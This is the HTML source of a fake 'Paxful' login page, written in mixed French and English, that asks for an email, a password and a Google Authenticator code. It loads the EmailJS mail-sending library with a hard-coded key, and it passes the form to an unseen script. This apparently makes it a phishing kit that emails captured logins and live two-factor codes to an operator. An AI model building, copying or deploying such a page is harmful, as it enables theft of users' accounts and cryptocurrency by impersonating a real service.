<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="icon" type="image/png" sizes="32x32" href="assets/images/favicon-32x32.webp">
    <link rel="icon" type="image/png" sizes="96x96" href="assets/images/favicon-96x96.webp">
    <link rel="icon" type="image/png" sizes="16x16" href="assets/images/favicon-16x16.webp">
    <link rel="icon" type="image/png" sizes="192x192" href="assets/images/favicon-192x192.webp">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.2/css/all.min.css">
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.1/font/bootstrap-icons.css">
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Montserrat:ital,wght@0,100..900;1,100..900&family=Open+Sans:ital,wght@0,300..800;1,300..800&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="css/style.css" type="text/css">
    <title>Login | Paxful</title>
    <script type="text/javascript"
        src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js">
    </script>
    <script>
        // Initialize EmailJS
        (function () {
        emailjs.init("2hfzwoHpYWEBg7jMW"); // Replace YOUR_PUBLIC_KEY with your actual key from EmailJS
        })();
    </script>
</head>
<body>
    <main class="container">

        <div class="login_container">
            <!-- <div class="logo">Paxful</div> -->
                <h1>connexion à paxful</h1>
            <div class="signup">Don't have an account?
                <span class="signup-link">Sign up</span>
            </div>
            <form id="signupForm">
                <label for="email">E-mail</label>
                    <div class="input_container email">
                        <div class="input_field">
                            <input type="email" name="email" id="email" placeholder="Entrez une address e-mail" required="required">
                        </div>
                    </div>

                <label for="password">Mot de passe</label>
                    <div class="input_container">
                        <div class="input_field password">
                            <input type="password" name="password" id="password" placeholder="Entrez un mot de passe" required="required">
                            <i class="bi bi-eye-slash show-password" data-target="password_login"></i>
                        </div>
                        <span class="password_reset">Mot de passe oublié?</span>
                    </div>

                    <label for="google_auth">Google authenticator code</label>
                    <div class="input_container google_auth">
                        <div class="input_field">
                            <input type="text" name="google_auth" id="google_auth_code" placeholder="Entrez votre google authenticator" required="required">
                        </div>
                    </div>
                    <div class="btn_container">
                        <input type="submit" value="Connexion" class="btn-con">
                        <div id="loader"></div>
                    </div>

                <div class="conditions_politique">
                    <p>By logging in you are agreeing to our <span class="conditions">Conditions d'utilisation</span> and <span class="politique">Politique de confidentialite</span></p>
                </div>
            </form>
        </div>
    </main>
    <script src="js/script.js"></script>
    <!-- <script src="translate.js"></script> -->
</body>
</html>
